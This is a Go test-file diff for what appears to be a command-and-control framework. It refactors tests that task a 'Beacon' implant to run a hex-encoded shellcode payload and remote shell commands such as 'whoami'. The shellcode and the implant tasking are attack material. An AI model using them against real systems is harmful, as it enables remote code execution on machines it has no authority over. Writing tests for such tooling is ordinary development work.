@@ -3,16 +3,18 @@ package test
 import (
 	"context"
 	"encoding/hex"
+	"sync"
 	"testing"
 	"time"
 
 	"github.com/stretchr/testify/require"
 
+	"project/internal/guid"
 	"project/internal/messages"
 	"project/internal/testsuite"
 )
 
-func TestExecuteShellCode(t *testing.T) {
+func TestModule(t *testing.T) {
 	iNode, bListener, Beacon := generateInitialNodeAndBeacon(t)
 	iNodeGUID := iNode.GUID()
 	beaconGUID := Beacon.GUID()
@@ -23,6 +25,40 @@ func TestExecuteShellCode(t *testing.T) {
 
 	ctrl.EnableInteractiveMode(beaconGUID)
 
+	// test 3 times
+	test := func(f func(t *testing.T, guid *guid.GUID)) {
+		wg := sync.WaitGroup{}
+		wg.Add(3)
+		for i := 0; i < 3; i++ {
+			go func() {
+				defer wg.Done()
+				f(t, beaconGUID)
+			}()
+		}
+		wg.Wait()
+	}
+
+	t.Run("execute shellcode", func(t *testing.T) {
+		test(testExecuteShellCode)
+	})
+
+	t.Run("shell", func(t *testing.T) {
+		test(testShell)
+	})
+
+	// clean
+	iNode.Exit(nil)
+	testsuite.IsDestroyed(t, iNode)
+	Beacon.Exit(nil)
+	testsuite.IsDestroyed(t, Beacon)
+
+	err = ctrl.DeleteBeaconUnscoped(beaconGUID)
+	require.NoError(t, err)
+	err = ctrl.DeleteNodeUnscoped(iNodeGUID)
+	require.NoError(t, err)
+}
+
+func testExecuteShellCode(t *testing.T, guid *guid.GUID) {
 	scHex := "fc4883e4f0e8c0000000415141505251564831d265488b5260488b52184" +
 		"88b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c" +
 		"1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4" +
@@ -38,52 +74,20 @@ func TestExecuteShellCode(t *testing.T) {
 		Method:    "vp",
 		ShellCode: scBytes,
 	}
-	err = ctrl.SendToBeacon(context.Background(), beaconGUID,
+	err := ctrl.SendToBeacon(context.Background(), guid,
 		messages.CMDBExecuteShellCode, &es, true)
 	require.NoError(t, err)
 
 	time.Sleep(5 * time.Second)
-
-	// clean
-	iNode.Exit(nil)
-	testsuite.IsDestroyed(t, iNode)
-	Beacon.Exit(nil)
-	testsuite.IsDestroyed(t, Beacon)
-
-	err = ctrl.DeleteBeaconUnscoped(beaconGUID)
-	require.NoError(t, err)
-	err = ctrl.DeleteNodeUnscoped(iNodeGUID)
-	require.NoError(t, err)
 }
 
-func TestShell(t *testing.T) {
-	iNode, bListener, Beacon := generateInitialNodeAndBeacon(t)
-	iNodeGUID := iNode.GUID()
-	beaconGUID := Beacon.GUID()
-
-	// connect Initial Node
-	err := Beacon.Synchronize(context.Background(), iNodeGUID, bListener)
-	require.NoError(t, err)
-
-	ctrl.EnableInteractiveMode(beaconGUID)
-
+func testShell(t *testing.T, guid *guid.GUID) {
 	shell := messages.Shell{
-		Command: "systeminfo",
+		Command: "whoami",
 	}
-	err = ctrl.SendToBeacon(context.Background(), beaconGUID,
+	err := ctrl.SendToBeacon(context.Background(), guid,
 		messages.CMDBShell, &shell, true)
 	require.NoError(t, err)
 
 	time.Sleep(5 * time.Second)
-
-	// clean
-	iNode.Exit(nil)
-	testsuite.IsDestroyed(t, iNode)
-	Beacon.Exit(nil)
-	testsuite.IsDestroyed(t, Beacon)
-
-	err = ctrl.DeleteBeaconUnscoped(beaconGUID)
-	require.NoError(t, err)
-	err = ctrl.DeleteNodeUnscoped(iNodeGUID)
-	require.NoError(t, err)
 }
